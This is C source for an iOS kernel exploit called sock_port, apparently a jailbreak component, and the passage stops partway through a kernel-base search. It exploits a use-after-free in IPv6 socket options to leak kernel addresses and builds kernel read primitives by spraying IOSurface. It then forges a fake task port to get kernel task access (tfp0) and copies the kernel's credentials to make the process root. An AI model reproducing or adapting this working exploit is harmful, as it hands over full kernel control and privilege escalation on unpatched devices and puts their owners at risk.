//
//  exploit.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright © 2019 Jake James. All rights reserved.
//  EDITED BY pwned4ever____ Copyright © 2019 Marcel Cianchino. All rights reserved.
//

#include "exploitSP.h"
#include "ImportantHolders.h"
//#include "KernelMemory.h"
//#include "exploit_additions.h"
#include "IOKitLib.h"
#include "IOKit.h"
#include "ImportantHolders.h"
#include "offsetsSP.h"

mach_port_t newClientSP;

uint64_t my_SP_ipcSpaceKernel;
// utilities to manipulate sockets
int set_minmtu(int sock, int *minmtu) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

int set_prefertempaddr(int sock, int *prefertempaddr) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, sizeof(*prefertempaddr));
}

int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

// free the pktopts struct of the socket to get ready for UAF
int free_socket_options(int sock) {
    return disconnectx(sock, 0, 0);
}

// return a socket we can UAF on
int get_socket() {
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        printf("[-] Can't get socket, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {
        printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    return sock;
}

// return a socket ready for UAF
int get_socket_with_dangling_options() {
    int socket = get_socket();
    
    int minmtu = -1;
    set_minmtu(socket, &minmtu);
    
    free_socket_options(socket);
    
    return socket;
}

mach_port_t new_port() {
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        printf("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        printf("[-] Failed to insert right (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    return port;
}

// first primitive: leak the kernel address of a mach port
uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
    // here we use the uaf as an info leak
    int sock = get_socket_with_dangling_options();
    
    for (int i = 0; i < 0x50000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        mach_port_t p = fill_kalloc_with_port_pointerSP(port, 192/sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
        
        int mtu;
        int pref;
        get_minmtu(sock, &mtu); // this is like doing rk32(options + 180);
        get_prefertempaddr(sock, &pref); // this like rk32(options + 184);
        
        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)
        
        /*  from a hex dump:
         
         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
                    |-----------||-----------|
                     minmtu here prefertempaddr here
         */
        
        // the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up
        
        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }
    
    // close that socket.
    close(sock);
    return 0;
}

// function to cache our task port kernel address
uint64_t task_self_addrSP() {
    static uint64_t cached_task_self_addr = 0;
    if (cached_task_self_addr) return cached_task_self_addr;
    else return find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    
}

// second primitive: read 20 bytes from addr
void* read_20_via_uaf(uint64_t addr) {
    
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    *(uint32_t*)((uint64_t)fake_opts + 164) = 0x41424344; // on iOS 10, offset is different
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface_SP((void *)fake_opts, sizeof(struct ip6_pktopts));
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] Failed to read kernel\n");
        return 0;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    void *buf = malloc(sizeof(struct in6_pktinfo));
    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
    close(sockets[found_at]);
    
    return buf;
}

uint64_t rk64_via_uaf(uint64_t addr) {
    void *buf = read_20_via_uaf(addr);
    if (buf) {
        uint64_t r = *(uint64_t*)buf;
        free(buf);
        return r;
    }
    return 0;
}

int null_20_via_uaf(uint64_t addr) {
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize
    *(uint32_t*)((uint64_t)fake_opts + 164) = 0x41424344; // on iOS 10, offset is different
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        spray_IOSurface_SP((void *)fake_opts, sizeof(struct ip6_pktopts));
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] failed to setup nulling primitive\n");
        return -1;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    struct in6_pktinfo *buf = malloc(sizeof(struct in6_pktinfo));
    memset(buf, 0, sizeof(struct in6_pktinfo));
    buf->ipi6_ifindex = 1;
    
    int ret = set_pktinfo(sockets[found_at], buf);
    free(buf);
    return ret;
}


static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

mach_port_t get_tfp0() {
    

    mach_port_t tipizer0 = MACH_PORT_NULL;
    uint64_t new_SP_task_port_kaddr = 0;
    uint64_t newIOSURFACEROOTUSERCLIENT_port_SP;

    
    printf("[!] exploit started!\n");
    
    offsetsSPJ_init();
    
    // -------------- INITIALIZE IOSURFACE --------------
    
    kern_return_t ret = init_IOSurface_SP();
    if (ret) {
        printf("[-] can't init IOSurface!\n");
        return MACH_PORT_NULL;
    }
    printf("[+] initialized IOSurface\n");
    
    // -------------- CHECK FOR SMAP --------------
    
    bool SMAP = false;
    int fds[2] = {-1, -1};
    
    if (pagesize == 0x4000) {
        struct utsname a;
        uname(&a);
        if (!strstr(a.machine, "iPad5,") && !strstr(a.machine, "iPad6,") && !strstr(a.machine, "iPhone8,")) {
            printf("[i] detected SMAP device\n");
            
            SMAP = true;
            int ret = pipe(fds);
            if (ret) {
                printf("[-] failed to create pipe fds\n");
                goto err;
            }
            uint8_t buf[0x600];
            memset(buf, 0, 0x600);
            write(fds[1], buf, 0x600);
            read(fds[0], buf, 0x600);
        }
    }
    
    // -------------- SETUP FIRST PRIMITIVES --------------
    uint64_t self_port_addr_SP;
    
    self_port_addr_SP = task_self_addrSP(); // port leak primitive
    if (!self_port_addr_SP) {
        printf("[-] failed to leak our task port address!\n");
        goto err;
    }
    
    printf("[*] our task port: 0x%llx\n", self_port_addr_SP);
    
#define rk64_check(addr) ({ uint64_t r; r = rk64_via_uaf(addr); if (!r) { usleep(100); r = rk64_via_uaf(addr); if (!r) { printf("[-] failed to read from '"#addr"'\n"); goto err;}}; r;})
    
    uint64_t ipc_space_kernel = rk64_check(self_port_addr_SP + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    printf("[*] ipc_space_kernel: 0x%llx\n", ipc_space_kernel);
    
    my_SP_ipcSpaceKernel = ipc_space_kernel;
    uint64_t pipe_buffer = 0;
    if (SMAP) {
        uint64_t task = rk64_check(self_port_addr_SP + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        uint64_t proc = rk64_check(task + koffsetS3(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint64_t p_fd = rk64_check(proc + koffsetS3(KSTRUCT_OFFSET_PROC_P_FD));
        uint64_t fd_ofiles = rk64_check(p_fd);
        uint64_t fproc = rk64_check(fd_ofiles + fds[0] * 8);
        uint64_t f_fglob = rk64_check(fproc + koffsetS3(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
        uint64_t fg_data = rk64_check(f_fglob + koffsetS3(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
        pipe_buffer = rk64_check(fg_data + koffsetS3(KSTRUCT_OFFSET_PIPE_BUFFER));
        
        printf("[*] pipe buffer: 0x%llx\n", pipe_buffer);
    }
            
    //-------- taken from async_wake --------
    
    uint32_t MAX_KERNEL_TRAILER_SIZE = 0x44;
    uint32_t replacer_body_size = (uint32_t)(message_size_for_kalloc_sizeSP(4096) - sizeof(mach_msg_header_t));
    uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;
    
    int n_pre_ports = 100000;
    mach_port_t *pre_ports = malloc(n_pre_ports * sizeof(mach_port_t));
    for (int i = 0; i < n_pre_ports; i++) {
        pre_ports[i] = new_port();
    }
    
    uint32_t smaller_body_size = (uint32_t)(message_size_for_kalloc_sizeSP(1024) - sizeof(mach_msg_header_t));
    
    uint8_t* smaller_body = malloc(smaller_body_size);
    memset(smaller_body, 'C', smaller_body_size);
    
    const int n_smaller_ports = 600;
    mach_port_t smaller_ports[n_smaller_ports];
    for (int i = 0; i < n_smaller_ports; i++) {
        smaller_ports[i] = send_kalloc_messageSP(smaller_body, smaller_body_size);
    }
    
    free(smaller_body);
    
    int ports_to_test = 100;
    int base = n_pre_ports - 1000;
    
    mach_port_t first_port = MACH_PORT_NULL;
    uint64_t first_port_address = 0;
    
    for (int i = 0; i < ports_to_test; i++) {
        mach_port_t candidate_port = pre_ports[base+i];
        uint64_t candidate_address = find_port_via_uaf(candidate_port, MACH_MSG_TYPE_COPY_SEND);
        uint64_t page_offset = candidate_address & 0xfff;
        if (page_offset > 0xa00 && page_offset < 0xe80) { // when using mach messages there are some limits as opposed to IOSurface
            printf("[+] found target port with suitable allocation page offset: 0x%016llx\n", candidate_address);
            pre_ports[base+i] = MACH_PORT_NULL;
            first_port = candidate_port;
            first_port_address = candidate_address;
            break;
        }
    }
    
    if (first_port == MACH_PORT_NULL) {
        printf("[-] unable to find a candidate port with a suitable page offset\n");
        goto err;
    }
    
    null_20_via_uaf(first_port_address);
    mach_port_insert_right(mach_task_self(), first_port, first_port, MACH_MSG_TYPE_MAKE_SEND);
    
    for (int i = 0; i < n_pre_ports; i++) {
        if (pre_ports[i]) {
            mach_port_destroy(mach_task_self(), pre_ports[i]);
        }
    }
    
    for (int i = 0; i < n_smaller_ports; i++) {
        mach_port_destroy(mach_task_self(), smaller_ports[i]);
    }
    
    uint8_t* body = malloc(replacer_body_size);
    memset(body, 0, replacer_body_size);
    uint32_t port_page_offset = first_port_address & 0xfff;
    
    kport_t *fakeport = (kport_t *)(body + (port_page_offset - message_body_offset));
    ktask_t *fake_task = malloc(0x600);
    bzero((void *)fake_task, 0x600);
    fake_task->ref_count = 0xff;
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 0xd00d;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    
    if (!SMAP) {
        fakeport->ip_kobject = (uint64_t)fake_task;
    }
    else {
        fakeport->ip_kobject = pipe_buffer;
        write(fds[1], fake_task, 0x600);
    }
    
    fakeport->ip_receiver = ipc_space_kernel;

    const int replacer_ports_limit = 200;
    mach_port_t replacer_ports[replacer_ports_limit];
    memset(replacer_ports, 0, sizeof(replacer_ports));
    uint32_t i;
    for (i = 0; i < replacer_ports_limit; i++) {
        replacer_ports[i] = send_kalloc_messageSP(body, replacer_body_size);
        pthread_yield_np();
        usleep(10000);
    }
    
    free(pre_ports);
    
    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffsetS3(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
#define kr32(addr, value)\
    if (SMAP) { \
        read(fds[0], fake_task, 0x600);\
    } \
    *read_addr_ptr = addr - koffsetS3(KSTRUCT_OFFSET_PROC_PID);\
    if (SMAP) { \
        write(fds[1], fake_task, 0x600);\
    } \
    value = 0x0;\
    ret = pid_for_task(first_port, (int *)&value);
    
    uint32_t read64_tmp;
#define kr64(addr, value)\
    kr32(addr + 0x4, read64_tmp);\
    kr32(addr, value);\
    value = value | ((uint64_t)read64_tmp << 32)
    
    // -------------- PLS WORK --------------
    
    uint64_t struct_task;
    kr64(self_port_addr_SP + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);
    if (!struct_task) {
        printf("[-] kernel read failed!\n");
        goto err;
    }
    
    if (struct_task == 0xffffffffffffffff){
        sleep(1);
        if (SMAP) {
            if (fds[0] != -1)  close(fds[0]);
            if (fds[1] != -1)  close(fds[1]);
        }
        deinit_IOSurface_SP();
        //free(struct_task);
        //free(self_port_addr_SP);

        exit(1);
    }
    printf("[!] READING VIA FAKE PORT WORKED? 0x%llx\n", struct_task);
    printf("[+] Let's steal that kernel task port!\n");
    
    // -------------- TFP0! --------------
    
    uint64_t kernel_vm_map = 0;
    
    while (struct_task != 0) {
        uint64_t bsd_info;
        kr64(struct_task + koffsetS3(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
        if (!bsd_info) {
            printf("[-] kernel read failed!\n");
            goto err;
        }
        
        uint32_t pid;
        kr32(bsd_info + koffsetS3(KSTRUCT_OFFSET_PROC_PID), pid);
        
        if (pid == 0) {
            uint64_t vm_map;
            kr64(struct_task + koffsetS3(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);
            if (!vm_map) {
                printf("[-] kernel read failed!\n");
                goto err;
            }
            
            kernel_vm_map = vm_map;
            break;
        }
        
        kr64(struct_task + koffsetS3(KSTRUCT_OFFSET_TASK_PREV), struct_task);
    }
    
    if (!kernel_vm_map) {
        printf("[-] failed to find kernel's vm_map\n");
        goto err;
    }
    
    printf("[i] kernel_vm_map: 0x%llx\n", kernel_vm_map);
    
    if (SMAP) {
        read(fds[0], fake_task, 0x600);
    }
    
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + 0xd8) = 1;
    
    if (SMAP) {
        write(fds[1], fake_task, 0x600);
    }
    
    init_kernel_memorySP(first_port);
    
    uint64_t addr = kallocSP(8);
    if (!addr) {
        printf("[-] seems like tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[*] allocated: 0x%llx\n", addr);
    wk64SP(addr, 0x4141414141414141);
    uint64_t readb = rk64SP(addr);
    kfreeSP(addr, 8);
    printf("[*] read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] read back value didn't match\n");
        goto err;
    }
    
    printf("[*] creating safer port\n");
    
    mach_port_t new_tfp0 = new_port();
    if (!new_tfp0) {
        printf("[-] failed to allocate new tfp0 port\n");
        goto err;
    }
    
    uint64_t new_addr = find_port_SP(new_tfp0, self_port_addr_SP);
    if (!new_addr) {
        printf("[-] failed to find new tfp0 port address\n");
        goto err;
    }
    
    uint64_t faketask = kallocSP(0x600);
    if (!faketask) {
        printf("[-] failed to kalloc faketask\n");
        goto err;
    }
    
    kwriteSP(faketask, fake_task, 0x600);
    fakeport->ip_kobject = faketask;
    
    kwriteSP(new_addr, (const void*)fakeport, sizeof(kport_t));
    
    printf("[*] testing new tfp0 port\n");
    
    init_kernel_memorySP(new_tfp0);
    
    addr = kallocSP(8);
    if (!addr) {
        printf("[-] seems like the new tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[+] tfp0: 0x%x\n", new_tfp0);
    printf("[*] allocated: 0x%llx\n", addr);
    wk64SP(addr, 0x4141414141414141);
    readb = rk64SP(addr);
    kfreeSP(addr, 8);
    printf("[*] read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] read back value didn't match\n");
        goto err;
    }
    
    // clean up port
    extern uint64_t task_addr_SP;
    uint64_t itk_space_SP;
    uint64_t is_table_SP;
    
    task_addr_SP = rk64SP(self_port_addr_SP + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    itk_space_SP = rk64SP(task_addr_SP + koffsetS3(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    is_table_SP = rk64SP(itk_space_SP + koffsetS3(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    current_task_s3_s3 = task_addr_SP;
    uint64_t mytaskselfpre;
    mytaskselfpre = find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    printf("[*] mytaskself  from mach tself ()= 0x%llx \n", mytaskselfpre );
    uint64_t keep_port_task = find_port_SP(new_tfp0, self_port_addr_SP);
    printf("[*] keep_proc_task from findportsp = 0x%llx \n", keep_port_task );

    task_addr_SP = task_addr_SP;
    printf("[*] task_addr_SP from rk64sp = 0x%llx \n ", task_addr_SP );
    uint64_t OURrealProcessAddress = rk64SP(task_addr_SP + SPkoffset(SPKSTRUCT_OFFSET_TASK_BSD_INFO));
    printf("[*] OURrealProcessAddress from rk64sp = 0x%llx \n", OURrealProcessAddress );
    uint64_t exported_itk_space_SP;

    exported_itk_space_SP = itk_space_SP;

    uint64_t task_xd = rk64SP(itk_space_SP + 0x28);
    uint64_t selfproc = rk64SP(task_xd + SPkoffset(SPKSTRUCT_OFFSET_TASK_BSD_INFO));
    
    //selfproc_cached = selfproc;
    uint64_t current_task_SP;
    uint64_t kern_task_addr;
    current_task_SP = rk64SP(self_port_addr_SP + 0x68);
    kern_task_addr = rk64SP(self_port_addr_SP + 0x68);
    
    uint32_t port_index = first_port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    wk32SP(is_table_SP + (port_index * sizeof_ipc_entry_t) + 8, 0);
    wk64SP(is_table_SP + (port_index * sizeof_ipc_entry_t), 0);
    
    for (int i = 0; i < replacer_ports_limit; i++) {
        mach_port_destroy(mach_task_self(), replacer_ports[i]);
    }
    
    if (SMAP) {
        if (fds[0] != -1)  close(fds[0]);
        if (fds[1] != -1)  close(fds[1]);
    }
    
    free(body);
    free(fake_task);
    
    
        tipizer0 = new_tfp0;
       // runningexploitFinal();

        //deinit_IOSurface_SP();
        
        
        
        
        
        
        int pid = getpid();
        printf("[*] task_addr_SP: 0x%llx\n", task_addr_SP);
        printf("[*] keep_port_task: 0x%llx\n", keep_port_task);
        kern_return_t retK = KERN_SUCCESS;
        
        io_connect_t client = MACH_PORT_NULL;
        mach_vm_size_t pagesize = 0;
        
        host_t host = HOST_NULL;
        host_t original_host = HOST_NULL;
        thread_t thread = THREAD_NULL;
        /********** ********** data hunting ********** **********/
        host = mach_host_self();
        original_host = host;
        thread = mach_thread_self();
        vm_size_t pgsz = 0;
        retK = _host_page_size(host, &pgsz);
        pagesize = pgsz;
        printf("page size: 0x%llx, %s\n", pagesize, mach_error_string(ret));
        if (ret != KERN_SUCCESS)
        {
            printf("failed to get page size! ret: %x %s\n", ret, mach_error_string(ret));
            goto out;
        }
        
        io_service_t serviceIOSR = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
        if (!MACH_PORT_VALID(serviceIOSR))
        {
            printf("failed to find IOSurfaceRoot service\n");
            retK = KERN_FAILURE;
            goto out;
        }
        printf("serviceIOSR: %x\n", serviceIOSR);
        
        retK = IOServiceOpen(serviceIOSR, mach_task_self(), 0, &client);
        printf("client: %x, %s\n", client, mach_error_string(retK));
        if (retK != KERN_SUCCESS || !MACH_PORT_VALID(client))
        {
            printf("failed to open an IOSurface client: %x (%s)\n", retK, mach_error_string(retK));
            goto out;
        }
        uint64_t iosruc_port = 0x0;
        iosruc_port = find_port_SP(client, self_port_addr_SP);
        printf("[*] IOSurfaceRootUserClient port! = 0x%06llx\n", iosruc_port);
     
        uint64_t iosruc_addr = 0x0;
        iosruc_addr = rk64SP(iosruc_port + SPkoffset(SPKSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); //offsetof(kport_t, ip_kobject), iosruc_addr);
        printf("iosruc_addr off 1: 0x%llx\n", iosruc_addr);
        uint64_t iosruc_vtab = 0x0;
        iosruc_vtab = rk64SP(iosruc_addr + 0x0);
        printf("iosruc_vtab: 0x%llx\n", iosruc_vtab);
        uint64_t iosruc_port_kernel = 0x0;
        iosruc_port_kernel = rk64SP(iosruc_port + SPkoffset(SPKSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));// OFFSET(ipc_port, ip_receiver));
        printf("[*] IOSurfaceRootUserClient iosruc_port_kernel port! = 0x%06llx\n", iosruc_port_kernel);
        tipizer0 = new_tfp0;
        uint64_t SP_task_ipc_spaceKERNEL_SP;
        printf("[*] SPtfp0  = 0x%x\n",tipizer0);
        SP_task_ipc_spaceKERNEL_SP = ipc_space_kernel;
        printf("[*] SP_task_ipc_spaceKERNEL_SP  = 0x%06llx\n",SP_task_ipc_spaceKERNEL_SP);
        printf("[*] itk_space_SP  = 0x%llx\n",itk_space_SP);

        new_SP_task_port_kaddr = task_addr_SP;
        printf("[*] new_SP_task_port_kaddr! = 0x%llx\n", new_SP_task_port_kaddr);
        printf("[*] self_port_addr? = 0x%llx\n",self_port_addr_SP);
        printf("[*] task_addrSP  = 0x%llx\n",(uint64_t)task_addr_SP);
        printf("[*] IOSurfaceRootUserClient addr! = 0x%llx\n", iosruc_addr);
        printf("[*] IOSurfaceRootUserClient_ye_SP my new client  = 0x%x\n", newClientSP);
        printf("[*] task_addr_SP is now rk64 of JustOurTask = 0x%llx\n", task_addr_SP);
    //task_self_addrSP = task_addr_SP;
    
        newIOSURFACEROOTUSERCLIENT_port_SP = iosruc_port;
        printf("[*] new_SP_task_port_kaddr struct_task  = 0x%llx\n",new_SP_task_port_kaddr);
        uint64_t selfprocSP = rk64SP(struct_task + SPkoffset(SPKSTRUCT_OFFSET_TASK_BSD_INFO));
        printf("[*] selfproc?: 0x%llx\n", selfprocSP);
        selfproc_ffs = selfprocSP;
        uint64_t ourtaskSP = rk64SP(selfprocSP + SPkoffset(SPKSTRUCT_OFFSET_PROC_TASK));// KSTRUCT_OFFSET_PROC_TASK);
        printf("[*] got ourtask addr taskport ?: 0x%llx\n", ourtaskSP);
        ourprocFinal_s3 = rk64SP(task_addr_SP + SPkoffset(SPKSTRUCT_OFFSET_TASK_BSD_INFO));
        printf("[*] got ourprocFinal: 0x%llx\n", ourprocFinal_s3);
        // find kernproc by looping linked list
        kernprocFinal_s3 = ourprocFinal_s3;
        while (kernprocFinal_s3 != 0x0){
            uint32_t found_pid = 0x0;
            found_pid = rk32SP(kernprocFinal_s3 + SPkoffset(SPKSTRUCT_OFFSET_PROC_PID));
            if (found_pid == 0){
                printf("[*] got kernprocFinal: 0x%llx\n", kernprocFinal_s3);
                break;
            }
            kernprocFinal_s3 = rk64SP(kernprocFinal_s3 + 0x0);//kernproc will always be at the start of the linked list, so we loop backwards in order to find it
        }
        if (kernprocFinal_s3 == 0x0){
            printf("failed to find kernproc\n");
        }
        printf("[*] got kernproc: 0x%llx\n", kernprocFinal_s3);
        uint64_t kerntaskFinal = 0x0;
        kerntaskFinal = rk64SP(kernprocFinal_s3 + SPkoffset(SPKSTRUCT_OFFSET_PROC_TASK));
        if (kerntaskFinal == 0x0)
        {
            printf("failed to find kerntask!\n");
        }
        printf("[*] got kerntask: 0x%llx\n", kerntaskFinal);
        uint64_t checkkerntaskFinal = 0x0;
        checkkerntaskFinal = rk64SP(kerntaskFinal + SPkoffset(SPKSTRUCT_OFFSET_TASK_BSD_INFO));
        if (checkkerntaskFinal == 0x0)
        {
            printf("failed to find kerntask!\n");
        }
        printf("[*] got checkkerntaskFinal: 0x%llx\n", checkkerntaskFinal);
        
    
    
    
    
    
    
    ///////
    
    
    // eleveate creds to kernel
    int elevateRet;
    int orig_uid = getuid();
    
    uint64_t orig_ucred_s3 = rk64SP(ourprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED));
    if (orig_ucred_s3 == 0x0)
    {
        printf("failed to get orig_ucred\n!");
        //goto out;
    }
    printf("orig_ucred: 0x%llx\n", orig_ucred_s3);
    
    uint64_t kern_ucred_s3 = rk64SP(kernprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED));
    if (kern_ucred_s3 == 0x0)
    {
        printf("failed to get kern_ucred!\n");
        elevateRet = KERN_FAILURE;
        //goto out;
    }
    printf("kern_ucred: 0x%llx\n", kern_ucred_s3);
    
    wk64SP(ourprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED), kern_ucred_s3);
    printf("setuid: %d, uid: %d\n", setuid(0), getuid());
    if (getuid() != 0)
    {
        printf("failed to elevate to root/kernel creds!\n");
        elevateRet = KERN_FAILURE;
    }
    
    host = mach_host_self();
    mach_port_t hsp4;
    elevateRet = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
    mach_port_deallocate(mach_host_self(), host);
    host = original_host;
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
        int myPidQ = getpid();
        uint64_t kernel_vm_mapFinal = 0x0;
        kernel_vm_mapFinal = rk64SP(kerntaskFinal + SPkoffset(SPKSTRUCT_OFFSET_TASK_VM_MAP));
        if (kernel_vm_mapFinal == 0x0)
        {
            printf("failed to find kernel_vm_map!\n");
        }
        printf("[*] got kernel vm map: 0x%llx\n", kernel_vm_mapFinal);
        uint64_t ipc_space_kernelFinal = 0x0;
        ipc_space_kernelFinal = SP_task_ipc_spaceKERNEL_SP;//rk64_check(self_port_addr_SP + SPkoffset(SPKSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
        printf("[*] ipc_space_kernel: 0x%llx\n", ipc_space_kernelFinal);
        uint64_t get_trap_for_index_addr = 0x0;
        get_trap_for_index_addr = rk64SP(iosruc_vtab + (SPkoffset(SPKSTRUCT_OFFSET_GET_TRAP_FOR_INDEX) * 0x8));
        if (get_trap_for_index_addr == 0x0)
        {
            printf("failed to get IOSurface::getExternalTrapForIndex func ptr!\n");
            goto out;
        }
        printf("get_trap_for_index_addr: 0x%llx\n", get_trap_for_index_addr);
        #define MH_MAGIC_64 0xfeedfacf /* the 64-bit mach magic number */
        #define MH_CIGAM_64 0xcffaedfe /* NXSwapInt(MH_MAGIC_64) */

        #define kernel_image_base           0xfffffff007004000
        #define KERNEL_HEADER_OFFSET        0x4000
        #define KERNEL_SLIDE_STEP           0x10000   //#define MAX_KASLR_SLIDE 0x21000000 // 0x200000 / 0x100000
        #define KERNEL_MAGIC MH_MAGIC_64
        uint64_t kernel_base = (get_trap_for_index_addr & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;//find_kernel_base();//
        printf("kernel_base: 0x%llx\n", kernel_base);
        do
        {
            uint32_t kbase_value = 0x0;
            kbase_value = rk32SP(kernel_base);
            if (kbase_value == MH_MAGIC_64){
                printf("[*] REAL found kernel_base: 0x%llx\n", kernel_base);
                //sleep(1);
                break;
            }
